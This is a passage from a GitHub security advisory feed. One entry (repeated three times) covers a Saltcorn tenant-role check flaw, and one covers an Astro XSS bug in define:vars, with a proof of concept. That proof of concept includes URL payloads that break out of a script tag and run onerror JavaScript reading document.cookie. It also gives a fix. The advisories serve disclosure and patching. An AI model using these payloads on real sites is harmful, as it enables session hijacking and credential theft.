<li><a href="https://github.com/NickCirv/engram/issues/7">https://github.com/NickCirv/engram/issues/7</a></li>
<li><a href="https://github.com/advisories/GHSA-2r2p-4cgf-hv7h">https://github.com/advisories/GHSA-2r2p-4cgf-hv7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r2p-4cgf-hv7h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T14:52:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/data] @saltcorn/data: Tenant user role is used for tenant creation role check]]></title>
        <id>https://github.com/advisories/GHSA-9237-rg5p-rhfw</id>
        <link href="https://github.com/advisories/GHSA-9237-rg5p-rhfw"/>
        <updated>2026-04-22T14:31:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When a tenant admin is logged out of the root domain (e.g., saltcorn.com) but logged in to their own tenant space as admin, they can simply append <code>/tenant/create</code> to their tenant URL. The system reads the role from the tenant context (admin), and a new tenant is created on the <strong>root domain</strong> (in <code>PUBLIC SCHEMA &gt; _sc_tenants</code>), rather than in the tenant's own <code>_sc_tenants</code> table.</p>
<p>If the same logic applies to other routes, a tenant admin effectively gains admin rights on the root domain.</p>
<h2 id="poc">PoC</h2>
<p>A tenant-created subtenant appears under the Saltcorn public schema instead of the tenant's own schema.</p>
<ul>
<li>Even when <code>role_id=1</code> is required for tenant creation on saltcorn.com (only admin can create tenants), existing tenant admins can still create new tenants because their local <code>role_id:1</code> is evaluated against the root domain.</li>
<li>Even when <code>role_to_create_tenant</code> is set to <code>0</code> in the tenant's <code>_sc_config</code> schema, or removed entirely, the tenant admin can still create sub-tenants on the root domain — suggesting <code>role_to_create_tenant</code> is not being read at all.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Tenant admins gain unauthorized admin-level access to the root domain. Any authenticated tenant admin can perform privileged operations (e.g., creating tenants) on the root domain by exploiting the role context mismatch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw</a></li>
<li><a href="https://github.com/advisories/GHSA-9237-rg5p-rhfw">https://github.com/advisories/GHSA-9237-rg5p-rhfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9237-rg5p-rhfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T14:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/data] @saltcorn/data: Tenant user role is used for tenant creation role check]]></title>
        <id>https://github.com/advisories/GHSA-9237-rg5p-rhfw</id>
        <link href="https://github.com/advisories/GHSA-9237-rg5p-rhfw"/>
        <updated>2026-04-22T14:31:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When a tenant admin is logged out of the root domain (e.g., saltcorn.com) but logged in to their own tenant space as admin, they can simply append <code>/tenant/create</code> to their tenant URL. The system reads the role from the tenant context (admin), and a new tenant is created on the <strong>root domain</strong> (in <code>PUBLIC SCHEMA &gt; _sc_tenants</code>), rather than in the tenant's own <code>_sc_tenants</code> table.</p>
<p>If the same logic applies to other routes, a tenant admin effectively gains admin rights on the root domain.</p>
<h2 id="poc">PoC</h2>
<p>A tenant-created subtenant appears under the Saltcorn public schema instead of the tenant's own schema.</p>
<ul>
<li>Even when <code>role_id=1</code> is required for tenant creation on saltcorn.com (only admin can create tenants), existing tenant admins can still create new tenants because their local <code>role_id:1</code> is evaluated against the root domain.</li>
<li>Even when <code>role_to_create_tenant</code> is set to <code>0</code> in the tenant's <code>_sc_config</code> schema, or removed entirely, the tenant admin can still create sub-tenants on the root domain — suggesting <code>role_to_create_tenant</code> is not being read at all.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Tenant admins gain unauthorized admin-level access to the root domain. Any authenticated tenant admin can perform privileged operations (e.g., creating tenants) on the root domain by exploiting the role context mismatch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw</a></li>
<li><a href="https://github.com/advisories/GHSA-9237-rg5p-rhfw">https://github.com/advisories/GHSA-9237-rg5p-rhfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9237-rg5p-rhfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T14:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/data] @saltcorn/data: Tenant user role is used for tenant creation role check]]></title>
        <id>https://github.com/advisories/GHSA-9237-rg5p-rhfw</id>
        <link href="https://github.com/advisories/GHSA-9237-rg5p-rhfw"/>
        <updated>2026-04-22T14:31:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When a tenant admin is logged out of the root domain (e.g., saltcorn.com) but logged in to their own tenant space as admin, they can simply append <code>/tenant/create</code> to their tenant URL. The system reads the role from the tenant context (admin), and a new tenant is created on the <strong>root domain</strong> (in <code>PUBLIC SCHEMA &gt; _sc_tenants</code>), rather than in the tenant's own <code>_sc_tenants</code> table.</p>
<p>If the same logic applies to other routes, a tenant admin effectively gains admin rights on the root domain.</p>
<h2 id="poc">PoC</h2>
<p>A tenant-created subtenant appears under the Saltcorn public schema instead of the tenant's own schema.</p>
<ul>
<li>Even when <code>role_id=1</code> is required for tenant creation on saltcorn.com (only admin can create tenants), existing tenant admins can still create new tenants because their local <code>role_id:1</code> is evaluated against the root domain.</li>
<li>Even when <code>role_to_create_tenant</code> is set to <code>0</code> in the tenant's <code>_sc_config</code> schema, or removed entirely, the tenant admin can still create sub-tenants on the root domain — suggesting <code>role_to_create_tenant</code> is not being read at all.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Tenant admins gain unauthorized admin-level access to the root domain. Any authenticated tenant admin can perform privileged operations (e.g., creating tenants) on the root domain by exploiting the role context mismatch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-9237-rg5p-rhfw</a></li>
<li><a href="https://github.com/advisories/GHSA-9237-rg5p-rhfw">https://github.com/advisories/GHSA-9237-rg5p-rhfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9237-rg5p-rhfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T14:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Astro: XSS in define:vars via incomplete </script> tag sanitization]]></title>
        <id>https://github.com/advisories/GHSA-j687-52p2-xcff</id>
        <link href="https://github.com/advisories/GHSA-j687-52p2-xcff"/>
        <updated>2026-04-21T20:39:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>defineScriptVars</code> function in Astro's server-side rendering pipeline uses a case-sensitive regex <code>/&lt;\/script&gt;/g</code> to sanitize values injected into inline <code>&lt;script&gt;</code> tags via the <code>define:vars</code> directive. HTML parsers close <code>&lt;script&gt;</code> elements case-insensitively and also accept whitespace or <code>/</code> before the closing <code>&gt;</code>, allowing an attacker to bypass the sanitization with payloads like <code>&lt;/Script&gt;</code>, <code>&lt;/script &gt;</code>, or <code>&lt;/script/&gt;</code> and inject arbitrary HTML/JavaScript.</p>
<h2 id="details">Details</h2>
<p>The vulnerable function is <code>defineScriptVars</code> at <code>packages/astro/src/runtime/server/render/util.ts:42-53</code>:</p>
<pre><code class="language-typescript">export function defineScriptVars(vars: Record&lt;any, any&gt;) {
    let output = '';
    for (const [key, value] of Object.entries(vars)) {
        output += `const ${toIdent(key)} = ${JSON.stringify(value)?.replace(
            /&lt;\/script&gt;/g,       // ← Case-sensitive, exact match only
            '\\x3C/script&gt;',
        )};\n`;
    }
    return markHTMLString(output);
}
</code></pre>
<p>This function is called from <code>renderElement</code> at <code>util.ts:172-174</code> when a <code>&lt;script&gt;</code> element has <code>define:vars</code>:</p>
<pre><code class="language-typescript">if (name === 'script') {
    delete props.hoist;
    children = defineScriptVars(defineVars) + '\n' + children;
}
</code></pre>
<p>The regex <code>/&lt;\/script&gt;/g</code> fails to match three classes of closing script tags that HTML parsers accept per the <a href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inbody">HTML specification §13.2.6.4</a>:</p>
<ol>
<li><strong>Case variations</strong>: <code>&lt;/Script&gt;</code>, <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/sCrIpT&gt;</code> — HTML tag names are case-insensitive but the regex has no <code>i</code> flag.</li>
<li><strong>Whitespace before <code>&gt;</code></strong>: <code>&lt;/script &gt;</code>, <code>&lt;/script\t&gt;</code>, <code>&lt;/script\n&gt;</code> — after the tag name, the HTML tokenizer enters the "before attribute name" state on ASCII whitespace.</li>
<li><strong>Self-closing slash</strong>: <code>&lt;/script/&gt;</code> — the tokenizer enters "self-closing start tag" state on <code>/</code>.</li>
</ol>
<p><code>JSON.stringify()</code> does not escape <code>&lt;</code>, <code>&gt;</code>, or <code>/</code> characters, so all these payloads pass through serialization unchanged.</p>
<p><strong>Execution flow:</strong> User-controlled input (e.g., <code>Astro.url.searchParams</code>) → assigned to a variable → passed via <code>define:vars</code> on a <code>&lt;script&gt;</code> tag → <code>renderElement</code> → <code>defineScriptVars</code> → incomplete sanitization → injected into <code>&lt;script&gt;</code> block in HTML response → browser closes the script element early → attacker-controlled HTML parsed and executed.</p>
<h2 id="poc">PoC</h2>
<p><strong>Step 1:</strong> Create an SSR Astro page (<code>src/pages/index.astro</code>):</p>
<pre><code class="language-astro">---
const name = Astro.url.searchParams.get('name') || 'World';
---
&lt;html&gt;
&lt;body&gt;
  &lt;h1&gt;Hello&lt;/h1&gt;
  &lt;script define:vars={{ name }}&gt;
    console.log(name);
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>Step 2:</strong> Ensure SSR is enabled in <code>astro.config.mjs</code>:</p>
<pre><code class="language-js">export default defineConfig({
  output: 'server'
});
</code></pre>
<p><strong>Step 3:</strong> Start the dev server and visit:</p>
<pre><code>http://localhost:4321/?name=&lt;/Script&gt;&lt;img/src=x%20onerror=alert(document.cookie)&gt;
</code></pre>
<p><strong>Step 4:</strong> View the HTML source. The output contains:</p>
<pre><code class="language-html">&lt;script&gt;const name = "&lt;/Script&gt;&lt;img/src=x onerror=alert(document.cookie)&gt;";
  console.log(name);
&lt;/script&gt;
</code></pre>
<p>The browser's HTML parser matches <code>&lt;/Script&gt;</code> case-insensitively, closing the script block. The <code>&lt;img onerror=alert(document.cookie)&gt;</code> is then parsed as HTML and the JavaScript in <code>onerror</code> executes.</p>
<p><strong>Alternative bypass payloads:</strong></p>
<pre><code>/?name=&lt;/script &gt;&lt;img/src=x onerror=alert(1)&gt;
/?name=&lt;/script/&gt;&lt;img/src=x onerror=alert(1)&gt;
/?name=&lt;/SCRIPT&gt;&lt;img/src=x onerror=alert(1)&gt;
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker can execute arbitrary JavaScript in the context of a victim's browser session on any SSR Astro application that passes request-derived data to <code>define:vars</code> on a <code>&lt;script&gt;</code> tag. This is a documented and expected usage pattern in Astro.</p>
<p>Exploitation enables:</p>
<ul>
<li><strong>Session hijacking</strong> via cookie theft (<code>document.cookie</code>)</li>
<li><strong>Credential theft</strong> by injecting fake login forms or keyloggers</li>
<li><strong>Defacement</strong> of the rendered page</li>
<li><strong>Redirection</strong> to attacker-controlled domains</li>
</ul>
<p>The vulnerability affects all Astro versions that support <code>define:vars</code> and is exploitable in any SSR deployment where user input reaches a <code>define:vars</code> script variable.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Replace the case-sensitive exact-match regex with a comprehensive escape that covers all HTML parser edge cases. The simplest correct fix is to escape all <code>&lt;</code> characters in the JSON output:</p>
<pre><code class="language-typescript">export function defineScriptVars(vars: Record&lt;any, any&gt;) {
    let output = '';
    for (const [key, value] of Object.entries(vars)) {
        output += `const ${toIdent(key)} = ${JSON.stringify(value)?.replace(
            /&lt;/g,
            '\\u003c',
        )};\n`;
    }
    return markHTMLString(output);
}
</code></pre>
<p>This is the standard approach used by frameworks like Next.js and Rails. Replacing every <code>&lt;</code> with <code>\u003c</code> is safe inside JSON string contexts (JavaScript treats <code>\u003c</code> as <code>&lt;</code> at runtime) and eliminates all possible <code>&lt;/script&gt;</code> variants including case variations, whitespace, and self-closing forms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-j687-52p2-xcff">https://github.com/withastro/astro/security/advisories/GHSA-j687-52p2-xcff</a></li>
<li><a href="https://github.com/withastro/astro/releases/tag/astro@6.1.6">https://github.com/withastro/astro/releases/tag/astro@6.1.6</a></li>
<li><a href="https://github.com/advisories/GHSA-j687-52p2-xcff">https://github.com/advisories/GHSA-j687-52p2-xcff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j687-52p2-xcff</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-21T20:39:49.000Z</published>
    </entry>
</feed>